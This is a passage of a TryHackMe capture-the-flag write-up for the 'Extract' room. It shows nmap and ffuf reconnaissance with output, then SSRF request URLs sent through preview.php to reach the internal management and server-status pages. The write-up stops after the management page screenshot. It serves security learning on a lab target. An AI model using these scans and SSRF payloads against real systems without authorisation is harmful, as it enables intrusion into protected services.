# 🕵️ Extract

* Solving [EXTRACT](https://tryhackme.com/room/extract)

## Discovery

1. First of all, Lets Find Open Ports: `nmap -p- -sV $TARGET` 🎯
```
Nmap scan report for $TARGET
Host is up (0.00024s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
MAC Address: 02:79:29:14:25:7F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. By checking Web Port(**80**) with `http://$TARGET`, It seems PDFs  are loaded From: `http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fpdf%2Fdummy.pdf`. Possibly the website is vulnerable to **Path Traversal** or **SSRF** 🔥

![Website View](images/02-web.png)
![Burpsuite View](images/02-ssrf.png)

3. I tested all [PHP Wrappers](https://www.php.net/manual/en/wrappers.php) but nothing found! so I decided to dig in deeper! 😅

4. Next, I tried Finding Hidden Directories Using [RAFT Medium Directory List](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt) 🔒
```sh
ffuf -w raft-medium-directories.txt -u "http://$TARGET/FUZZ/"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://$TARGET/FUZZ/
 :: Wordlist         : FUZZ: raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

pdf                     [Status: 200, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 403, Size: 277, Words: 20, Lines: 10]
icons                   [Status: 403, Size: 277, Words: 20, Lines: 10]
management              [Status: 403, Size: 14, Words: 2, Lines: 1]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

5. I could Find **2** valuable Directories, but we don't have direct access to them. 😵
```
management
server-status
```

6. But, PDF Preview link may be able to load other URLs for us! 👍🏻
```
management:
http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fmanagement%2F

server-status:
http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fserver-status%2F
```

![Management Page](images/06-management.png)

